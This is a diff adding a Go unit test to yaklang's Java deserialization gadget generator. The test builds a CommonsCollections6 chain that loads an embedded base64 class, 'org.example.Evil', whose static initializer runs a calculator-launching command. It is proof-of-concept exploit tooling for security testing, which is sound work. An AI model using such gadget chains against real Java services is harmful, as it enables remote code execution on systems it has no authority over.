@@ -1,11 +1,14 @@
 package yso
 
 import (
+	"encoding/base64"
 	"fmt"
+	"strings"
+	"testing"
+
 	"github.com/yaklang/yaklang/common/javaclassparser"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yserx"
-	"testing"
 )
 
 func TestGenerateGadget(t *testing.T) {
@@ -197,5 +200,39 @@ func TestMUSTPASSSetMajorVersion(t *testing.T) {
 			}
 
 		})
+	}
+}
+
+func TestGenerateGadget_ByteArrayReplace(t *testing.T) {
+	param := map[string]string{
+		"className":   "org.example.Evil",
+		"base64Class": "yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvRXZpbDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwACQAKBwAgDAAhACIBABJvcGVuIC1hIENhbGN1bGF0b3IMACMAJAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACUACgEAEG9yZy9leGFtcGxlL0V2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAMADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAGAAkACQAMAAcADQAIABEACgANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW",
+	}
+	obj, err := GenerateGadget(string(GadgetCommonsCollections6), "defining_class_loader", param)
+	if err != nil {
+		t.Errorf("GenerateGadget() error = %v", err)
+		return
+	}
+	objByte, _ := ToBytes(obj)
+	base64Ser := base64.StdEncoding.EncodeToString(objByte)
+	t.Logf("base64Ser = %v", base64Ser)
+	objDump, err := yserx.ParseJavaSerialized(objByte)
+	if err != nil {
+		t.Errorf("ParseJavaSerialized() error = %v", err)
+		return
+	}
+	objJson, _ := yserx.ToJson(objDump)
+	// 如果包含{{param0}}或者{{param1}}，则说明替换失败
+	if strings.Contains(string(objJson), "{{param0}}") || strings.Contains(string(objJson), "{{param1}}") {
+		t.Errorf("ReplaceByteArrayInJavaSerilizable() error = %v", err)
+		return
+	}
+
+	if strings.Contains(string(objJson), param["className"]) && strings.Contains(string(objJson), param["base64Class"]) {
+		t.Logf("ReplaceByteArrayInJavaSerilizable() success")
+		return
+	} else {
+		t.Errorf("ReplaceByteArrayInJavaSerilizable() error = %v", err)
+		return
 	}
 }
